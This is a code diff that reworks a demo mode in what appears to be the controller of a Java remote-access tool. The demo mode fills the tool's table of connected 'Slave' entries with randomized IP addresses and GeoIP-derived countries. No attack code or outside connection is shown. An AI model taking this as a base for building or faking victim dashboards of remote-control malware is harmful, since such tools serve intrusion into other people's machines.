@@ -2,12 +2,22 @@ package com.redpois0n;
 
 import java.util.Random;
 
+import com.redpois0n.ip2c.Country;
 import com.redpois0n.ui.frames.Frame;
+import com.redpois0n.utils.FlagUtils;
+import com.redpois0n.utils.NetworkUtils;
 
 
-public class Sample {
+public class SampleMode {
 	
-	public static void addSample() {		
+	private static boolean sampleMode = false;
+	
+	public static boolean isInSampleMode() {
+		return sampleMode;
+	}
+	
+	public static void start() {	
+		sampleMode = true;
 		make("AD");
 		make("AE");
 		make("AF");
@@ -217,7 +227,6 @@ public class Sample {
 		make("TF");
 		make("TG");
 		make("TH");
-		make("THUMBS.DB");
 		make("TJ");
 		make("TK");
 		make("TL");
@@ -254,15 +263,33 @@ public class Sample {
 	}
 	
 	public static void make(String country) {
-		int i = (new Random()).nextInt(50000);
-		Main.connections.add(generate(country, "" + i));
-		Frame.mainModel.addRow(new Object[] { country, "Example", "Example", "127.0.0.1 / " + i, "0", "Example", "Example", "Example" });	
+		int i = (new Random()).nextInt(65535);
+		
+		String ip = NetworkUtils.randomizeIP() + " / " + i;
+		
+		Slave slave = generate(country, ip);
+		
+		Main.connections.add(slave);
+		
+		Frame.mainModel.addRow(new Object[] { slave.getCountry(), "Example", "Example", ip, "0", "Example", "Example", "Example" });	
 	}
 	
-	public static Slave generate(String country, String suffix) {
+	public static Slave generate(String country, String ip) {
 		Slave slave = new Slave(null, null);
+		
+		if (Settings.getBoolean("geoip")) {
+			Country c = FlagUtils.getCountry(ip.split(" / ")[0]);
+			
+			if (c != null) {
+				country = c.get2cStr().toUpperCase();
+			} else {
+				country = "?";
+			}
+		}
+		
 		slave.setCountry(country);
-		slave.setIP("127.0.0.1 / " + suffix);
+		
+		slave.setIP(ip);
 		return slave;
 	}
 
